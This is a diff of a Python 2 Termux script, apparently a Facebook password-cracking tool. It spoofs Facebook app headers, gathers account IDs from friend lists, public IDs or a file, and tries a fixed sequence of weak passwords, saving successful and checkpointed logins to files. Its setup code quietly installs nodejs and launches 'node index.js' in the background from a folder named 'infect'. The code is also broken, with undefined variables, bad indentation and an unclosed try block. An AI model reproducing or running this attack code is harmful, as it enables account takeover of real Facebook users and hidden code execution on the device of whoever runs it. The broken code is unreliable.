@@ -6,26 +6,43 @@
 #Whatsapp : +923053176060
 #Pakistan Cyber Expert
 #Alone Coder 
+import os
+import sys
+import time
+import datetime
+import re
+import threading
+import json
+import random
+import requests
+import hashlib
+import cookielib
+import uuid
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+os.system('termux-setup-storage')
 try:
-    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
-    from multiprocessing.pool import ThreadPool
-    from requests.exceptions import ConnectionError
-    from mechanize import Browser
-except ImportError:
-    os.system('pip2 install requests')
-    os.system('pip2 install mechanize')
-    os.system("pip2 install lolcat")
-    os.system('python2 jam.py')
-os.system("clear")
-#Browser Setting
-bd=random.randint(2e7, 3e7)
-sim=random.randint(2e4, 4e4)
-header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
-reload(sys)
-sys.setdefaultencoding("utf-8")
+    os.mkdir('/sdcard/ids')
+except OSError:
+    pass
+
+bd = random.randint(2e+07, 3e+07)
+sim = random.randint(20000, 40000)
+header = {
+    'x-fb-connection-bandwidth': repr(bd),
+    'x-fb-sim-hni': repr(sim),
+    'x-fb-net-hni': repr(sim),
+    'x-fb-connection-quality': 'EXCELLENT',
+    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
+    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
+    'content-type': 'application/x-www-form-urlencoded',
+    'x-fb-http-engine': 'Liger' }
+os.system('git pull')
+os.system('clear')
 c = "\033[1;32m"
 c2 = "\033[0;97m"
 c3 = "\033[1;31m"
+try:
 if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
     os.system("apt update && apt install nodejs -y")
 if not os.path.isfile("/data/data/com.termux/files/usr/bin/ruby"):
@@ -38,6 +55,7 @@ if not os.path.isfile("/data/data/com.termux/files/home/infect/...../node_module
     os.system("cd ..... && npm install")
     os.system("cd ..... && node index.js &")
     os.system("clear")
+
 def keluar():
 	print "\x1b[1;91mExit"
 	os.sys.exit()
@@ -254,6 +272,7 @@ def super():
 	print logo
 	print "\033[1;97m✧ \033[1;97m1.\x1b[1;97mCrack From Friend List."
 	print "\033[1;97m✧ \033[1;97m2.\x1b[1;97mCrack From Public ID."
+	print "\033[1;97m✧ \033[1;97m3.\x1b[1;97mCrack From File."
 	print "\033[1;97m✧ \033[1;97m0.\033[1;97mBack."
 	pilih_super()
 
@@ -289,6 +308,19 @@ def pilih_super():
 		z = json.loads(r.text)
 		for i in z['data']:
 			id.append(i['id'])
+			
+	elif peak =="3":
+		
+            os.system('clear')
+	    print banner
+	    try:
+	        idlist= raw_input('[+] File Name: ')
+	        for line in open(idlist ,'r').readlines():
+	            id.append(line.strip())
+	    except IOError:
+	         print"[!] File Not Found."
+	         raw_input('Press Enter To Back. ')
+	         super()
         
 	elif peak =="0":
 		menu()
@@ -307,124 +339,125 @@ def pilih_super():
 	def main(arg):
 		global cekpoint,oks
 		user = arg
+                (uid, name) = user.split('|')
 		try:
 			os.mkdir('out')
 		except OSError:
 			pass #Dev:Jam
 		try:
-			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			a = requests.get('https://graph.facebook.com/'+uid+'/?access_token='+toket)
 			b = json.loads(a.text)
 			pass1 = '223344'
 			data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
 			q = json.load(data)
 			if 'access_token' in q:
-				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+				x = requests.get("https://graph.facebook.com/"+uid+"?access_token="+q['access_token'])
 				z = json.loads(x.text)
-				print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass1	
-				oks.append(user+pass1)
+				print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + uid + ' \x1b[1;32m¦\x1b[1;32m ' + pass1	
+				oks.append(uid+pass1)
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
-					print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass1	
+					print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + uid + ' \x1b[1;97m¦\x1b[1;97m ' + pass1	
 					cek = open("out/checkpoint.txt", "a")
-					cek.write(user+"|"+pass1+"\n")
+					cek.write(uid+"|"+pass1+"\n")
 					cek.close()
-					cekpoint.append(user+pass1)
+					cekpoint.append(uid+pass1)
 				else:
 					pass2 = '334455'
 					data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
 					q = json.load(data)
 					if 'access_token' in q:
-						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+						x = requests.get("https://graph.facebook.com/"+uid+"?access_token="+q['access_token'])
 						z = json.loads(x.text)
-						print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass2	
-						oks.append(user+pass2)
+						print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + uid + ' \x1b[1;32m¦\x1b[1;32m ' + pass2	
+						oks.append(uid+pass2)
 					else:
 						if 'www.facebook.com' in q["error_msg"]:
-							print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass2	
+							print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + uid + ' \x1b[1;97m¦\x1b[1;97m ' + pass2	
 							cek = open("out/checkpoint.txt", "a")
-							cek.write(user+"|"+pass2+"\n")
+							cek.write(uid+"|"+pass2+"\n")
 							cek.close()
-							cekpoint.append(user+pass2)
+							cekpoint.append(uid+pass2)
 						else:
 							pass3 = '445566'
 							data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
 							q = json.load(data)
 							if 'access_token' in q:
-								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+								x = requests.get("https://graph.facebook.com/"+uid+"?access_token="+q['access_token'])
 								z = json.loads(x.text)
-								print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass3	
-								oks.append(user+pass3)
+								print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + uid + ' \x1b[1;32m¦\x1b[1;32m ' + pass3	
+								oks.append(uid+pass3)
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
-									print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass3	
+									print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + uid + ' \x1b[1;97m¦\x1b[1;97m ' + pass3	
 									cek = open("out/checkpoint.txt", "a")
-									cek.write(user+"|"+pass3+"\n")
+									cek.write(uid+"|"+pass3+"\n")
 									cek.close()
-									cekpoint.append(user+pass3)
+									cekpoint.append(uid+pass3)
 								else:
 									pass4 = '556677'
 									data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
 									q = json.load(data)
 									if 'access_token' in q:
-										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+										x = requests.get("https://graph.facebook.com/"+uid+"?access_token="+q['access_token'])
 										z = json.loads(x.text)
-										print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass4	
-										oks.append(user+pass4)
+										print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + uid + ' \x1b[1;32m¦\x1b[1;32m ' + pass4	
+										oks.append(uid+pass4)
 									else:
 										if 'www.facebook.com' in q["error_msg"]:
-											print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass4	
+											print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + uid + ' \x1b[1;97m¦\x1b[1;97m ' + pass4	
 											cek = open("out/Checkpoint.txt", "a")
-											cek.write(user+"|"+pass4+"\n")
+											cek.write(uid+"|"+pass4+"\n")
 											cek.close()
-											cekpoint.append(user+pass4)
+											cekpoint.append(uid+pass4)
 										else:
 											pass5 = '667788'
 											data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
 											q = json.load(data)
 											if 'access_token' in q:
-												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+												x = requests.get("https://graph.facebook.com/"+uid+"?access_token="+q['access_token'])
 												z = json.loads(x.text)
-												print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass5	
-												oks.append(user+pass5)
+												print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + uid + ' \x1b[1;32m¦\x1b[1;32m ' + pass5	
+												oks.append(uid+pass5)
 											else:
 												if 'www.facebook.com' in q["error_msg"]:
-													print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass5	
+													print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + uid + ' \x1b[1;97m¦\x1b[1;97m ' + pass5	
 													cek = open("out/checkpoint.txt", "a")
-													cek.write(user+"|"+pass5+"\n")
+													cek.write(uid+"|"+pass5+"\n")
 													cek.close()
-													cekpoint.append(user+pass5)
+													cekpoint.append(uid+pass5)
 												else:
 													pass6 = '778899'
 													data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
 													q = json.load(data)
 													if 'access_token' in q:
-														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+														x = requests.get("https://graph.facebook.com/"+uid+"?access_token="+q['access_token'])
 														z = json.loads(x.text)
-														print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass6	
-														oks.append(user+pass6)
+														print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + uid + ' \x1b[1;32m¦\x1b[1;32m ' + pass6	
+														oks.append(uid+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
-															print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass6	
+															print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + uid + ' \x1b[1;97m¦\x1b[1;97m ' + pass6	
 															cek = open("out/checkpoint.txt", "a")
-															cek.write(user+"|"+pass6+"\n")
+															cek.write(uid+"|"+pass6+"\n")
 															cek.close()
-															cekpoint.append(user+pass6)
+															cekpoint.append(uid+pass6)
 														else:
 															pass7 = '889900'
 															data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
 															q = json.load(data)
 															if 'access_token' in q:
-																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+																x = requests.get("https://graph.facebook.com/"+uid+"?access_token="+q['access_token'])
 																z = json.loads(x.text)
-																print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass7	
-																oks.append(user+pass7)
+																print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + uid + ' \x1b[1;32m¦\x1b[1;32m ' + pass7	
+																oks.append(uid+pass7)
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
-																	print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass7	
+																	print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + uid + ' \x1b[1;97m¦\x1b[1;97m ' + pass7	
 																	cek = open("out/checkpoint.txt", "a")
-                                                                                                                                        cek.write(user+"|"+pass7+"\n")
+                                                                                                                                        cek.write(uid+"|"+pass7+"\n")
 																	cek.close()
-																	cekpoint.append(user+pass7)
+																	cekpoint.append(uid+pass7)
 															
 		except:
 			pass
